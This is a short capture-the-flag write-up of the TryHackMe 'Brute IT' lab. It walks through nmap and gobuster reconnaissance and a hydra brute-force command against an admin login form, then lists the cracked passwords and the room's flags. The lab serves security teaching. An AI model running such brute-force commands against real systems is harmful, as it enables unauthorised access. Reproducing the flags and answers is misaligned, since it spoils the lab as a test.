---
title: "Brute IT - TryHackMe"
category: "THM"
pubDate: 2021-01-27
description: "Learn how to brute, hash cracking and escalate privileges in this box!"
---
[TryHackMe | Brute IT](https://tryhackme.com/room/bruteit)

In this box you will learn about:

- Brute-force
- Hash cracking
- Privilege escalation

---

## Before attacking, let's get information about the target

### Search for open ports using nmap, how many ports are open?

```
Desktop/TryHackMe/brut_it » nmap -A -vv 10.10.93.226 -oN nmap_result
```

![](../images/bruteit/Untitled.png)

```
2 ports are open.
```

### What version of SSH is running?

```
OpenSSH 7.6p1
```

![](../images/bruteit/Untitled1.png)

### What version of Apache is running?

```
2.4.29
```

![](../images/bruteit/Untitled2.png)

### Which Linux distribution is running?

```
ubuntu
```

![](../images/bruteit/Untitled3.png)

### Search for hidden directories on web server, what is the hidden directory?

```
Desktop/TryHackMe/brut_it » gobuster -u 10.10.93.226 -w /opt/directory-list-2.3-medium.txt
```

![](../images/bruteit/Untitled4.png)

```
# Hidden directory 
/admin
```

---

## Find a form to get a shell on SSH.

### What is the user:password of the admin panel?

![](../images/bruteit/Untitled5.png)

As you can see, there is the user and password in the form data, we can use this to brute-force the login with hydra.

Hidden message

![](../images/bruteit/Untitled6.png)

```
# Hydra command (Pretty straightforward)
hydra -l admin -P /opt/rockyou.txt 10.10.93.226 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

![](../images/bruteit/Untitled7.png)

```
# Credentials 
admin:xavier
```

### Crack the RSA key you found, what is John's RSA Private Key passphrase?

![](../images/bruteit/Untitled8.png)

```
# Password for the private key is
rockinroll
```

### user.txt

```
THM{a_password_is_not_a_barrier}
```

![](../images/bruteit/Untitled9.png)

### Web flag

![](../images/bruteit/Untitled10.png)

```
THM{brut3_f0rce_is_e4sy}
```

---

### Find a form to escalate your privileges, what is the root's password?

```
# Password for the root user
football
```

![](../images/bruteit/Untitled11.png)

### Root.txt

```
THM{pr1v1l3g3_3sc4l4t10n}
```

![](../images/bruteit/Untitled12.png)

